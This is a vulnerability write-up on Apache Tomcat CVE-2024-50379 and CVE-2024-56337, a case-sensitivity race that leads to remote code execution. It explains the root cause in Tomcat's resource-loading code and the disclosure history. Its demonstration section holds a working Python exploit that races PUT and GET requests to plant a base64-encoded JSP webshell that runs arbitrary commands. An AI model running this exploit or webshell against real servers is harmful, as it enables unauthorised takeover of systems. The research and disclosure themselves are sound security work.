---
title: CVE-2024-50379 && CVE-2024-56337 - Apache Tomcat RCE via write enabled Default Servlet
date: 2024-12-20 23:59:00 +0800
author: WHOAMI
toc: true
categories: ["Java Security"]
tags: ["Apache", "Tomcat"]
layout: post
---

## Overview

In the process of loading JSP files, Tomcat on MacOS and Windows platforms uses the `File.exists()` method which is case-insensitive. Therefore, when checking whether a file exists, Tomcat uses conditional competition to load a file similar to "xxx.Jsp" (where the first letter of "xxx.Jsp" is capitalized) and executes it successfully, and finally takes over the server control privilege.

## Impact

The vulnerability can successfully take over the server control privilege.

## Scope

- All versions of Apache Tomcat. The vulnerability has been successfully exploited on Tomcat 8, 9, 10, and 11.
- All versions of Apache TomEE.

## Condition

Tomcat enable HTTP PUT request (or there is any file upload vulnerability, any file write vulnerability, etc.).

## Analysis

### Case 01: poc.Jsp exists in webapps/ROOT

First, we write "poc.Jsp" (the first letter of  "poc.Jsp" is uppercase) to webapps/ROOT:

![image-20241023220813035](/assets/posts/2024-12-20-apache-tomcat-rce-via-write-enabled-default-servlet/image-20241023220813035.png)

In Tomcat's lib, we locate the `file()` method in the `org.apache.catalina.webresources.AbstractFileResourceSet` class and start Debug.

Then we set a breakpoint at the `file()` method and access "http://hostname:8080/poc.jsp", and the breakpoint is triggered:

![image-20241023220850568](/assets/posts/2024-12-20-apache-tomcat-rce-via-write-enabled-default-servlet/image-20241023220850568.png)

Keep "Stop Over" until the `canPath` parameter is successfully assigned:

![image-20241023220922758](/assets/posts/2024-12-20-apache-tomcat-rce-via-write-enabled-default-servlet/image-20241023220922758.png)

As you can see, the parameter is assigned by the `file.getCanonicalPath()` function, which returns the canonical path name of a given file object. But strangely, it is not "poc.jsp" that is obtained here, but "poc.Jsp" (the first letter of  "poc.Jsp" is uppercase). This is because the `file.getCanonicalPath()` function is case-sensitive.

Let's look down, `canPath.equalsIgnoreCase(absPath)` will check whether `canPath` and `absPath` are equal, but since `canPath` here is "poc.Jsp" (the first letter of  "poc.Jsp" is uppercase) and `absPath` is "poc.jsp" (the first letter of  "poc.jsp" is lowercase), it is obvious that it will not pass the check here and will eventually return `null`:

![image-20241023221037374](/assets/posts/2024-12-20-apache-tomcat-rce-via-write-enabled-default-servlet/image-20241023221037374.png)

After returning to the `org.apache.catalina.webresources.DirResourceSet#getResource()` function, since `f` is `null`, it will directly return `new EmptyResource(root, path)`:

![image-20241023221130747](/assets/posts/2024-12-20-apache-tomcat-rce-via-write-enabled-default-servlet/image-20241023221130747.png)

Finally, poc.Jsp (the first letter of  "poc.Jsp" is uppercase) will not be loaded successfully, and the HTTP response will return a 404 Error.

### Case 02: poc.Jsp does not exist in webapps/ROOT

In this case, at the very beginning, poc.Jsp does not exist in webapps/ROOT:

![image-20241023221231376](/assets/posts/2024-12-20-apache-tomcat-rce-via-write-enabled-default-servlet/image-20241023221231376.png)

We still set a breakpoint at the `org.apache.catalina.webresources.AbstractFileResourceSet#file()` method and access "http://hostname:8080/poc.jsp" again. The `canPath` obtained at this time is "poc.jsp" (the first letter of  "poc.jsp" is lowercase):

![image-20241023221341049](/assets/posts/2024-12-20-apache-tomcat-rce-via-write-enabled-default-servlet/image-20241023221341049.png)

So we can check it with `canPath.equalsIgnoreCase(absPath)` as follows:

![image-20241023221431179](/assets/posts/2024-12-20-apache-tomcat-rce-via-write-enabled-default-servlet/image-20241023221431179.png)

After returning to the `org.apache.catalina.webresources.DirResourceSet#getResource()` function, since `f` is not `null`, it will not return directly, but continue to go down to `else if (!f.exists())` to determine whether the poc.jsp file exists:

![image-20241023221557041](/assets/posts/2024-12-20-apache-tomcat-rce-via-write-enabled-default-servlet/image-20241023221557041.png)

If we write "poc.Jsp" (the first letter of  "poc.Jsp" is uppercase) to webapps/ROOT at this time:

![image-20241023221636680](/assets/posts/2024-12-20-apache-tomcat-rce-via-write-enabled-default-servlet/image-20241023221636680.png)

Then the `else if (!f.exists())` check will also pass directly, and finally the "poc.Jsp" (the first letter of  "poc.Jsp" is uppercase) in webapps/ROOT will be successfully loaded and executed:

![image-20241023221716893](/assets/posts/2024-12-20-apache-tomcat-rce-via-write-enabled-default-servlet/image-20241023221716893.png)

![image-20241023221957498](/assets/posts/2024-12-20-apache-tomcat-rce-via-write-enabled-default-servlet/image-20241023221957498.png)

This is because the underlying call of the `f.exists()` method on Windows and MacOS is case-insensitive. This is also the root cause of the vulnerability!

Therefore, we can use conditional competition to continuously send HTTP PUT requests to upload poc.Jsp and continuously send HTTP GET requests to access poc.jsp. Finally, we can successfully obtain server control permissions.

In addition, if Tomcat does not enable HTTP PUT requests, we can also achieve the same effect by using arbitrary file upload vulnerabilities, arbitrary file write vulnerabilities, etc.

## Demonstration

- EXP

```python
import requests
import threading
from io import BytesIO

stop_requests = False
target_url = "http://172.26.10.3:8080"

def send_put():
    global stop_requests
    while not stop_requests:
        payload = BytesIO(b'''
<%@ page import="java.util.Base64, java.io.FileOutputStream, java.io.IOException" %>
<%
    String base64EncodedData = "PCVAIHBhZ2UgY29udGVudFR5cGU9InRleHQvaHRtbDtjaGFyc2V0PVVURi04IiBsYW5ndWFnZT0iamF2YSIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmlvLkJ5dGVBcnJheU91dHB1dFN0cmVhbSIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmlvLklucHV0U3RyZWFtIiAlPgo8JQogICAgSW5wdXRTdHJlYW0gaW4gPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSkuZ2V0SW5wdXRTdHJlYW0oKTsKICAgIEJ5dGVBcnJheU91dHB1dFN0cmVhbSBiYW9zID0gbmV3IEJ5dGVBcnJheU91dHB1dFN0cmVhbSgpOwogICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsKICAgIGludCBhID0gLTE7CgogICAgd2hpbGUgKChhID0gaW4ucmVhZChiKSkgIT0gLTEpIHsKICAgICAgICBiYW9zLndyaXRlKGIsIDAsIGEpOwogICAgfQoKICAgIG91dC53cml0ZShuZXcgU3RyaW5nKGJhb3MudG9CeXRlQXJyYXkoKSkpOwolPg==";
    byte[] decodedData = Base64.getDecoder().decode(base64EncodedData);
    String filePath = application.getRealPath("/") + "shell.jsp";
    FileOutputStream fos = null;

    try {
        fos = new FileOutputStream(filePath);
        fos.write(decodedData);
        out.println(filePath);
    } catch (IOException e) {
        out.println(e.getMessage());
    }
%>''')
        response = requests.put(url=target_url + '/poc.Jsp', data=payload)
        print(f"[*] PUT request sent, status code: {response.status_code}")

def send_get():
    global stop_requests
    while not stop_requests:
        response = requests.get(target_url + '/poc.jsp')
        print(f"[*] GET request sent, status code: {response.status_code}")
        if response.status_code != 404:
            print("[+] Webshell has been written: " + response.text.lstrip().rstrip())
            stop_requests = True
            exit(0)

#def send_delete():
#    global stop_requests
#    while not stop_requests:
#        response = requests.delete(target_url + '/poc.Jsp')
#        print(f"[*] DELETE request sent, status code: {response.status_code}")

if __name__ == "__main__":

    # Creating threads
    get_thread = threading.Thread(target=send_get)
    put_thread = threading.Thread(target=send_put)
    #delete_thread = threading.Thread(target=send_delete)

    # Start threads
    get_thread.start()
    put_thread.start()
    #delete_thread.start()

    # Waiting for threads
    get_thread.join()
    put_thread.join()
    #delete_thread.join()

    print("[+] The vulnerability was successfully exploited!")
```

## Fix

In October 2024, we first reported the vulnerability to Apache Tomcat. Although the official maintainers acknowledged the seriousness of the issue, they were unable to reproduce the vulnerability. It wasn’t until November 2, 2024, that they commited the change [cc7a98b5](https://github.com/apache/tomcat/commit/cc7a98b57c6dc1df21979fcff94a36e068f4456c) to the Tomcat project repository and assigned [CVE-2024-50379](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-50379) with a disclosure date of December 17, 2024.

<img src="/assets/posts/2024-12-20-apache-tomcat-rce-via-write-enabled-default-servlet/image-20241221154858289.png" style="zoom: 40%;" />

However, the [cc7a98b5](https://github.com/apache/tomcat/commit/cc7a98b57c6dc1df21979fcff94a36e068f4456c) change did not actually fix the vulnerability, and it could still be easily exploited even after the disclosure of [CVE-2024-50379](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-50379).

During the [CVE-2024-50379](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-50379) disclosure period, we also submitted several fix suggestions to Apache Tomcat, but the maintainers rejected them, citing concerns that they might negatively impact Tomcat’s performance.

It wasn’t until December 20, 2024, that the official maintainers finally recognized the root cause of the vulnerability and improved the mitigation measures in the disclosure of [CVE-2024-56337](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-56337).

<img src="/assets/posts/2024-12-20-apache-tomcat-rce-via-write-enabled-default-servlet/image-20241221155008682.png" alt="image-20241221155008682" style="zoom:33%;" />

## Discoverer && Credit

- Nacl
- WHOAMI
- Yemoli
- Ruozhi
